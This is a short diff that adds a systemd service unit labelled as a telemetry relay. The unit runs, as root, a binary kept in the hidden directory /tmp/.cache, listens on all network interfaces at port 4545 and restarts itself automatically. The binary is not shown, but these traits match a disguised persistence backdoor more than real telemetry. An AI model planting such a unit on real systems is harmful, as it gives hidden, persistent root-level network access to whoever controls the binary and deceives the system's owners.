@@ -1,0 +1,13 @@
+[Unit]
+Description=Telemetry relay agent
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/.cache/telemetry-relay --listen 0.0.0.0:4545
+Restart=always
+RestartSec=5
+User=root
+
+[Install]
+WantedBy=multi-user.target
